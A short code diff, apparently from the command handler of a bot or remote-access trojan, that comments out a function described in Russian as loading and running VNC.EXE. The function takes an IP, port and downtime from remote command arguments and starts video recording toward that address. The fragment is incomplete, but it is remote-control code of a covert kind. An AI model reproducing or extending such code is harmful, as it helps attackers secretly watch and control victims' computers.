@@ -1071,6 +1071,7 @@ bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
 //загружает и запускает VNC.EXE
 bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 {
+/*
 	char ip[24];
 	int downtime, port;
 	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
@@ -1084,6 +1085,7 @@ bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 	else
 		TASKDBG( "VNC", "VNC уже запущен" );
 	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
+*/
 	return true;
 }
 
